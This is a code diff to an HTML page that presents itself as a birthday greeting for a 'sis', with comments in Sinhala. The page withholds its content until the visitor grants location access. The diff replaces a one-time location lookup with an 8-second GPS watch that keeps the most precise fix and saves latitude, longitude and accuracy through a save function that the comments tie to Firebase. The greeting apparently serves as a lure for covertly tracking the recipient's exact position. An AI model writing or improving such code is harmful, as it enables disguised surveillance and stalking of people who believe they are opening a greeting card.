@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Happy Birthday Rasangika!</title>
+    <title>Happy Birthday !</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;700&family=Patrick+Hand&family=Yaldevi:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -348,10 +348,8 @@
                 try {
                     const result = await navigator.permissions.query({ name: 'geolocation' });
                     if (result.state === 'granted') {
-                        isLocationAllowed = true;
-                        closeAllPopups();
-                        enableMainInterface();
-                        requestLocationAccess(false); // දැනටමත් Allow කරලා නම් Location අරන් Save කරනවා
+                        // දැනටමත් Allow කරලා නම්, 8-second GPS Watch එක පටන් ගන්නවා
+                        requestLocationAccess(false); 
                     } else if (result.state === 'denied') {
                         showPopup('overlay3', 'card3');
                     } else {
@@ -362,23 +360,70 @@
         }
 
         function requestLocationAccess(showPopupOnError = true) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        isLocationAllowed = true;
-                        closeAllPopups();
-                        enableMainInterface(); // Reload නැතුව Button එක On කරනවා
-                        if (window.saveLocationData) {
-                            await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
-                        }
-                    },
-                    (error) => {
-                        closeAllPopups();
-                        if (showPopupOnError) showPopup('overlay2', 'card2');
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
+            if (!navigator.geolocation) {
+                closeAllPopups();
+                if (showPopupOnError) showPopup('overlay2', 'card2');
+                return;
             }
+
+            const btn = document.getElementById('mainButton');
+            if(btn) btn.innerText = "Finding best signal...";
+
+            let bestPosition = null;
+            let watchId = null;
+            let timeoutId = null;
+            const scanDuration = 8000; // තත්පර 8 ක GPS Warm-up කාලය
+
+            const options = { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 };
+
+            // තත්පර 8කට පස්සේ (හෝ හොඳම එකක් ආවම) මේක වැඩ කරනවා
+            const processBestLocation = async () => {
+                if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+                clearTimeout(timeoutId);
+                
+                if (bestPosition) {
+                    closeAllPopups();
+                    try {
+                        if (window.saveLocationData) {
+                            await window.saveLocationData({ 
+                                lat: bestPosition.coords.latitude, 
+                                lng: bestPosition.coords.longitude, 
+                                accuracy: bestPosition.coords.accuracy 
+                            });
+                            console.log("Saved best accuracy:", bestPosition.coords.accuracy);
+                        }
+                    } catch(e) { console.error("Save Error:", e); }
+                    
+                    isLocationAllowed = true;
+                    enableMainInterface(); 
+                } else {
+                    // Location ගන්නම බැරි වුණොත්
+                    closeAllPopups();
+                    if (showPopupOnError) showPopup('overlay2', 'card2');
+                }
+            };
+
+            // Watch Position පටන් ගන්නවා (එන හැම location එකම බලනවා)
+            watchId = navigator.geolocation.watchPosition(
+                (pos) => {
+                    // අලුත් එකේ Accuracy එක කලින් එකට වඩා හොඳ නම් ඒක තියාගන්නවා (අගය අඩුවෙන්න අඩුවෙන්න Accuracy වැඩියි)
+                    if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
+                        bestPosition = pos;
+                    }
+                    
+                    // මීටර් 20 කට වඩා නිවැරදි එකක් ආවොත්, තත්පර 8ක් ඉන්නේ නැතුව එවලෙම ඒක Save කරනවා
+                    if (bestPosition.coords.accuracy <= 20) {
+                        processBestLocation();
+                    }
+                },
+                (error) => { console.warn("Location scan warning:", error); },
+                options
+            );
+
+            // හරියටම තත්පර 8කට පස්සේ ඒ වෙලාවට තියෙන හොඳම Location එක අරන් වැඩේ ඉවර කරනවා
+            timeoutId = setTimeout(() => {
+                processBestLocation();
+            }, scanDuration);
         }
 
         function showPopup(overlayId, cardId) {
@@ -399,74 +444,8 @@
             const btn = document.getElementById('mainButton');
             btn.style.pointerEvents = 'auto';
             btn.disabled = false;
-            btn.innerText = "Let's go sis 🤗"; // සාමාන්‍ය text එක ආයෙත් දානවා
+            btn.innerText = "Let's go sis 🤗"; 
             btn.style.opacity = '1';
-        }
-
-        async function checkAndShowPopup() {
-            if (navigator.permissions && navigator.permissions.query) {
-                try {
-                    const result = await navigator.permissions.query({ name: 'geolocation' });
-                    if (result.state === 'granted') {
-                        // Location එක අරන් Firebase එකට ලියලා ඉවර වුණාට පස්සෙයි Button එක Enable කරන්නේ
-                        requestLocationAccess(false); 
-                    } else if (result.state === 'denied') {
-                        showPopup('overlay3', 'card3');
-                    } else {
-                        showPopup('overlay1', 'card1');
-                    }
-                } catch(e) { showPopup('overlay1', 'card1'); }
-            } else { showPopup('overlay1', 'card1'); }
-        }
-
-        function requestLocationAccess(showPopupOnError = true) {
-            if (!navigator.geolocation) {
-                closeAllPopups();
-                if (showPopupOnError) showPopup('overlay2', 'card2');
-                return;
-            }
-
-            // Options: මුලින්ම High Accuracy (GPS) බලනවා තත්පර 15ක් ඇතුළත
-            const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
-
-            const successCallback = async (pos) => {
-                closeAllPopups();
-                try {
-                    if (window.saveLocationData) {
-                        await window.saveLocationData({ 
-                            lat: pos.coords.latitude, 
-                            lng: pos.coords.longitude, 
-                            accuracy: pos.coords.accuracy 
-                        });
-                    }
-                } catch(e) {
-                    console.error("Save Error:", e);
-                }
-                
-                // හැමදේම සම්පූර්ණ වුණාට පස්සේ විතරක් Button එක On කරනවා
-                isLocationAllowed = true;
-                enableMainInterface(); 
-            };
-
-            const errorCallback = (error) => {
-                console.warn("High accuracy failed, trying low accuracy...", error);
-                // High Accuracy ෆේල් වුණොත්, Low Accuracy (Network/Wi-Fi) වලින් ආයෙත් Try කරනවා
-                if (options.enableHighAccuracy) {
-                    options.enableHighAccuracy = false;
-                    options.timeout = 10000;
-                    navigator.geolocation.getCurrentPosition(successCallback, finalErrorCallback, options);
-                } else {
-                    finalErrorCallback(error);
-                }
-            };
-
-            const finalErrorCallback = (error) => {
-                closeAllPopups();
-                if (showPopupOnError) showPopup('overlay2', 'card2');
-            };
-
-            // Process එක පටන් ගන්නවා
-            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
         }
 
         function showGuideInPopup2() {
